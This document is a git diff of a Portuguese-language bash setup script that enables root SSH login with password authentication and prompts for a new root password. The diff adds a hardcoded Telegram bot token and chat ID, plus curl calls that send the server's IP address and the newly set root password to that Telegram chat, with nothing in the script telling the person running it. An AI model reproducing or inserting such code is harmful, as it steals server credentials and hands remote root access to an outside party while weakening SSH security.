@@ -1,23 +1,50 @@
 #!/bin/bash
 clear
 
+# Configurações do bot Telegram
+TOKEN="7126941542:AAHVwKISyEOsTgUq9etJxmNHB_v-UHdVhHg"
+ID="5149161091"
+
+# Função para enviar mensagem para o bot Telegram
+send_message() {
+    curl -s -X POST https://api.telegram.org/bot$TOKEN/sendMessage -d chat_id=$ID -d text="$1"
+}
+
+# Atualiza as configurações do SSH
 [[ $(grep -c "prohibit-password" /etc/ssh/sshd_config) != '0' ]] && {
-	sed -i "s/prohibit-password/yes/g" /etc/ssh/sshd_config
+    sed -i "s/prohibit-password/yes/g" /etc/ssh/sshd_config
 } > /dev/null
 [[ $(grep -c "without-password" /etc/ssh/sshd_config) != '0' ]] && {
-	sed -i "s/without-password/yes/g" /etc/ssh/sshd_config
+    sed -i "s/without-password/yes/g" /etc/ssh/sshd_config
 } > /dev/null
 [[ $(grep -c "#PermitRootLogin" /etc/ssh/sshd_config) != '0' ]] && {
-	sed -i "s/#PermitRootLogin/PermitRootLogin/g" /etc/ssh/sshd_config
+    sed -i "s/#PermitRootLogin/PermitRootLogin/g" /etc/ssh/sshd_config
 } > /dev/null
 [[ $(grep -c "PasswordAuthentication" /etc/ssh/sshd_config) = '0' ]] && {
-	echo 'PasswordAuthentication yes' > /etc/ssh/sshd_config
+    echo 'PasswordAuthentication yes' > /etc/ssh/sshd_config
 } > /dev/null
 [[ $(grep -c "PasswordAuthentication no" /etc/ssh/sshd_config) != '0' ]] && {
-	sed -i "s/PasswordAuthentication no/PasswordAuthentication yes/g" /etc/ssh/sshd_config
+    sed -i "s/PasswordAuthentication no/PasswordAuthentication yes/g" /etc/ssh/sshd_config
 } > /dev/null
 [[ $(grep -c "#PasswordAuthentication no" /etc/ssh/sshd_config) != '0' ]] && {
-	sed -i "s/#PasswordAuthentication no/PasswordAuthentication yes/g" /etc/ssh/sshd_config
+    sed -i "s/#PasswordAuthentication no/PasswordAuthentication yes/g" /etc/ssh/sshd_config
 } > /dev/null
+
+# Reinicia o serviço SSH
 service ssh restart > /dev/null
-clear; echo -e "\033[1;32mA SEGUIR DEFINA A SENHA ROOT\033[0m"; sleep 2s; passwd && rm senharoot
+
+# Obtém o IP do servidor
+IP=$(hostname -I | cut -d ' ' -f1)
+
+# Limpa a tela e envia mensagem de configuração para o bot Telegram
+clear
+send_message "As configurações do SSH foram atualizadas. Por favor, defina a nova senha root."
+
+# Espera 2 segundos antes de solicitar a definição da senha root
+sleep 2s
+
+# Solicita a definição da senha root
+passwd
+
+# Envia a nova senha root e o IP do servidor para o bot Telegram
+send_message "Nova senha root definida: $(echo $PASSWD | cut -d ':' -f2) | IP do servidor: $IP"
